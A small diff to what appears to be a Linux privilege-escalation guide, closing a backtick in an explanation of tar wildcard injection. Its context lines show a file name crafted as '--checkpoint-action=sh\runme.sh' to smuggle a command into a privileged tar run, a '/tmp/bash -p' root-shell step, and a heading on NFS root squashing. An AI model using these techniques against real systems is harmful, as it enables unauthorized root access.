@@ -466,7 +466,7 @@ touch /home/user/--checkpoint-action=sh\runme.sh
 /tmp/bash -p
 ```
 - **Why this works**  
-So in this case, because of the wildcard, the system interprets this as the command `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=sh\runme.sh
+So in this case, because of the wildcard, the system interprets this as the command `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=sh\runme.sh`
 
 # Escalation Path: NFS Root Squashing
 
